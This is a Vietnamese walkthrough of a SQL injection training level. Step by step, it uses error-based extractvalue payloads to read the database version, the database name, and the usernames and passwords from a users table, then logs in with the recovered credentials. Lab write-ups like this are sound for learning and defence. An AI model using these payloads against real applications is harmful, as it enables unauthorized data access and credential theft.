# <div align="center"><p> SQL-Injection/Level_9</p></div>
 ### MỤC LỤC
   [SQL-Injection](#gioithieu)
   
### Nội dung báo cáo 
#### SQL-Injection <a name="gioithieu"></a>
- B1: Đây là trang web của level9.

  ![image](https://user-images.githubusercontent.com/101852647/167064518-639d8742-a1ed-43b3-b8e9-b33a7a4d0616.png)

- B2: Thử chèn 1' thì thấy trang web trả về thông báo lỗi.

  ![image](https://user-images.githubusercontent.com/101852647/167064630-128c830b-3f1b-4305-9890-3d270518710d.png)

- B3: Thử chèn `' union select 1,2#` vẫn thấy thông báo lỗi.

  ![image](https://user-images.githubusercontent.com/101852647/167064709-7c53bd83-c5c4-40d5-b845-911942202004.png)

- B4: Bây giờ chúng ta sẽ sử dụng câu lệnh `' or extractvalue(0x0a,concat(0x0a,(select version())) or ' ` để tìm phiên bản.

  ![image](https://user-images.githubusercontent.com/101852647/167064842-333002c9-e138-408a-a118-3f8fbcaa46cb.png)

- B5: Bây giờ chúng ta sẽ sử dụng câu lệnh `' or extractvalue(0x0a,concat(0x0a,(select database())) or ' ` để tìm tên database.

  ![image](https://user-images.githubusercontent.com/101852647/167064892-82f5ba2d-778d-4239-82c6-a3030a2d03ec.png)

- B6: Sử dụng câu lệnh ` ' or extractvalue(0x0a,concat(0x0a,(select group_concat(username) from level9_users))) or '` để tìm username. Kết quả trả về cho chúng ta tên `username=TheBlueFlower`

  ![image](https://user-images.githubusercontent.com/101852647/167064943-b13a7c3f-9494-497a-b0af-ca65ad11f3fa.png)

- B7: Sử dụng câu lệnh ` ' or extractvalue(0x0a,concat(0x0a,(select group_concat(password) from level9_users))) or '` để tìm password.Kết quả trả về cho chúng ta `password= this_oassword_is_SEC//Ure.promised!`

  ![image](https://user-images.githubusercontent.com/101852647/167064977-534098ca-a66e-4bf4-a196-a0af2d990b00.png)

- B8: Thử đăng nhập `ussername=TheBlueFlower ` và `password=this_oassword_is_SEC//Ure.promised! ` và kết quả trả về đăng nhập thành công.

  ![image](https://user-images.githubusercontent.com/101852647/167065092-9e7c3671-40eb-427e-944b-3e704a8ecc9e.png)

